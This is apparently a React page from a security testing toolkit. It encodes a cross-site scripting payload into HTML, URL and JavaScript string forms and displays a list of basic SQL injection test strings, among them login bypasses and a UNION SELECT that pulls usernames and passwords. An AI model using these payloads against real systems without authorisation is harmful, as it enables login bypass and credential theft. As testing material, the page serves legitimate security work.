"use client"
import { useMemo, useState } from 'react'
import Section from '@/components/Section'

function htmlEntities(str: string){
	return str.replace(/./g, (c) => `&#${c.charCodeAt(0)};`)
}
function urlEncode(str: string){
	return encodeURIComponent(str)
}
function jsStringEncode(str: string){
	return str.replace(/\\/g,'\\\\').replace(/`/g,'\\`').replace(/\n/g,'\\n').replace(/\r/g,'\\r').replace(/\t/g,'\\t').replace(/"/g,'\\"').replace(/'/g, "\\'")
}

const defaultXss = '<script>alert(1)</script>'

const basicSQLi = [
	"' OR '1'='1 -- ",
	"' OR '1'='1 /*",
	"admin'--",
	"admin' #",
	"' UNION SELECT null-- ",
	"' UNION SELECT username, password FROM users-- ",
]

export default function PayloadsPage(){
	const [payload, setPayload] = useState(defaultXss)
	const encoded = useMemo(()=>({
		html: htmlEntities(payload),
		url: urlEncode(payload),
		js: jsStringEncode(payload),
	}), [payload])

	return (
		<div className="space-y-8">
			<Section title="XSS Encoder" subtitle="Encode a payload into HTML entities, URL encoding, JS string">
				<div className="flex flex-col gap-3">
					<textarea value={payload} onChange={e=>setPayload(e.target.value)} className="w-full h-24 bg-slate-950 border border-slate-800 rounded p-2" />
					<div className="grid sm:grid-cols-3 gap-3 text-xs">
						<div><div className="font-medium mb-1">HTML Entities</div><textarea readOnly className="w-full h-24 bg-slate-950 border border-slate-800 rounded p-2">{encoded.html}</textarea></div>
						<div><div className="font-medium mb-1">URL Encoded</div><textarea readOnly className="w-full h-24 bg-slate-950 border border-slate-800 rounded p-2">{encoded.url}</textarea></div>
						<div><div className="font-medium mb-1">JS String</div><textarea readOnly className="w-full h-24 bg-slate-950 border border-slate-800 rounded p-2">{encoded.js}</textarea></div>
					</div>
				</div>
			</Section>
			<Section title="Basic SQLi Test Payloads">
				<ul className="list-disc pl-5 text-sm space-y-1">
					{basicSQLi.map((p, i)=> <li key={i} className="font-mono">{p}</li>)}
				</ul>
			</Section>
		</div>
	)
} 